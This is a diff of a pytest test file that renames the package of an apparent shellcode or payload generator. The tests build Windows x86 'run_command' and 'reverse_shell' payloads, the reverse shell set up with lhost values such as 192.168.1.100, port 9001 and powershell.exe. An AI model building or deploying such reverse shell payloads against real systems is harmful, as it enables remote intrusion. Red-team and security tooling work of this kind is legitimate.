@@ -3,15 +3,15 @@ from __future__ import annotations
 
 import pytest
 
-from emitera.payload_templates.base import TemplateConfig
-from emitera.workflow.ir import (
+from emitrion.payload_templates.base import TemplateConfig
+from emitrion.workflow.ir import (
     Block,
     Immediate,
     Workflow,
     WriteStructField,
     ZeroStruct,
 )
-from emitera.workflow.reference import (
+from emitrion.workflow.reference import (
     WorkflowTemplate,
     build_reverse_shell_workflow,
     build_run_command_workflow,
@@ -20,7 +20,7 @@ from emitera.workflow.reference import (
 
 class TestRunCommandWorkflow:
     def test_workflow_is_valid(self):
-        from emitera.workflow.validator import validate
+        from emitrion.workflow.validator import validate
         w = build_run_command_workflow()
         result = validate(w)
         assert result.valid, result.errors
@@ -70,7 +70,7 @@ class TestX86Lowering:
 
     @pytest.fixture
     def lowered_asm(self, manifest_dir):
-        from emitera.build import build
+        from emitrion.build import build
         result = build(
             str(manifest_dir / "calc.yaml"),
             template_name="ir_run_command",
@@ -129,7 +129,7 @@ class TestEndToEndBuild:
     """Test that the IR workflow builds through the full pipeline."""
 
     def test_build_no_assemble(self, manifest_dir, tmp_path):
-        from emitera.build import build
+        from emitrion.build import build
         result = build(
             str(manifest_dir / "calc.yaml"),
             template_name="ir_run_command",
@@ -142,7 +142,7 @@ class TestEndToEndBuild:
         assert result.layout is not None
 
     def test_build_write_outputs(self, manifest_dir, tmp_path):
-        from emitera.build import build, write_outputs
+        from emitrion.build import build, write_outputs
         result = build(
             str(manifest_dir / "calc.yaml"),
             template_name="ir_run_command",
@@ -154,7 +154,7 @@ class TestEndToEndBuild:
         assert (tmp_path / "Documentation" / "contract.md").exists()
 
     def test_contract_mentions_winexec(self, manifest_dir, tmp_path):
-        from emitera.build import build
+        from emitrion.build import build
         result = build(
             str(manifest_dir / "calc.yaml"),
             template_name="ir_run_command",
@@ -165,7 +165,7 @@ class TestEndToEndBuild:
 
     def test_legacy_build_not_regressed(self, manifest_dir, tmp_path):
         """Verify legacy run_command template still works."""
-        from emitera.build import build
+        from emitrion.build import build
         result = build(
             str(manifest_dir / "calc.yaml"),
             template_name="run_command",
@@ -178,7 +178,7 @@ class TestEndToEndBuild:
 
     def test_legacy_revshell_not_regressed(self, manifest_dir, tmp_path):
         """Verify legacy reverse_shell template still works."""
-        from emitera.build import build
+        from emitrion.build import build
         result = build(
             str(manifest_dir / "revshell.yaml"),
             template_name="reverse_shell",
@@ -194,9 +194,9 @@ class TestStructLowering:
     """Test ZeroStruct and WriteStructField lowering."""
 
     def test_zero_struct_emits_assembly(self):
-        from emitera.api_database import STRUCT_DATABASE
-        from emitera.stack_alloc import Slot, StackLayout
-        from emitera.workflow.x86_backend import _LoweringContext
+        from emitrion.api_database import STRUCT_DATABASE
+        from emitrion.stack_alloc import Slot, StackLayout
+        from emitrion.workflow.x86_backend import _LoweringContext
 
         si_size = STRUCT_DATABASE["STARTUPINFOA"].size
         layout = StackLayout([
@@ -211,9 +211,9 @@ class TestStructLowering:
         assert "xor  eax, eax" in asm
 
     def test_write_struct_field_emits_assembly(self):
-        from emitera.api_database import STRUCT_DATABASE
-        from emitera.stack_alloc import Slot, StackLayout
-        from emitera.workflow.x86_backend import _LoweringContext
+        from emitrion.api_database import STRUCT_DATABASE
+        from emitrion.stack_alloc import Slot, StackLayout
+        from emitrion.workflow.x86_backend import _LoweringContext
 
         si_size = STRUCT_DATABASE["STARTUPINFOA"].size
         layout = StackLayout([
@@ -231,7 +231,7 @@ class TestDeterminism:
     """Identical inputs must produce identical outputs."""
 
     def test_deterministic_asm(self, manifest_dir, tmp_path, monkeypatch):
-        from emitera.build import build
+        from emitrion.build import build
         monkeypatch.setenv("SOURCE_DATE_EPOCH", "0")
         result1 = build(
             str(manifest_dir / "calc.yaml"),
@@ -255,7 +255,7 @@ class TestDeterminism:
 
 class TestReverseShellWorkflow:
     def test_workflow_is_valid(self):
-        from emitera.workflow.validator import validate
+        from emitrion.workflow.validator import validate
         w = build_reverse_shell_workflow()
         result = validate(w)
         assert result.valid, result.errors
@@ -270,7 +270,7 @@ class TestReverseShellWorkflow:
         }
 
     def test_workflow_with_custom_params(self):
-        from emitera.workflow.validator import validate
+        from emitrion.workflow.validator import validate
         w = build_reverse_shell_workflow(
             lhost="10.0.0.1", lport=9001, command="powershell.exe",
         )
@@ -340,7 +340,7 @@ class TestReverseShellLowering:
 
     @pytest.fixture
     def revshell_asm(self, manifest_dir):
-        from emitera.build import build
+        from emitrion.build import build
         config = TemplateConfig(lhost="192.168.1.100", lport=9001)
         result = build(
             str(manifest_dir / "revshell.yaml"),
@@ -394,7 +394,7 @@ class TestReverseShellEndToEnd:
     """Test that the IR reverse shell builds through the full pipeline."""
 
     def test_build_no_assemble(self, manifest_dir, tmp_path):
-        from emitera.build import build
+        from emitrion.build import build
         config = TemplateConfig(lhost="192.168.1.100", lport=9001)
         result = build(
             str(manifest_dir / "revshell.yaml"),
@@ -410,7 +410,7 @@ class TestReverseShellEndToEnd:
         assert "CreateProcessA" in result.contract_md
 
     def test_build_write_outputs(self, manifest_dir, tmp_path):
-        from emitera.build import build, write_outputs
+        from emitrion.build import build, write_outputs
         config = TemplateConfig(lhost="192.168.1.100", lport=9001)
         result = build(
             str(manifest_dir / "revshell.yaml"),
@@ -424,7 +424,7 @@ class TestReverseShellEndToEnd:
         assert (tmp_path / "Documentation" / "contract.md").exists()
 
     def test_deterministic_asm(self, manifest_dir, tmp_path, monkeypatch):
-        from emitera.build import build
+        from emitrion.build import build
         monkeypatch.setenv("SOURCE_DATE_EPOCH", "0")
         config = TemplateConfig(lhost="192.168.1.100", lport=9001)
         result1 = build(
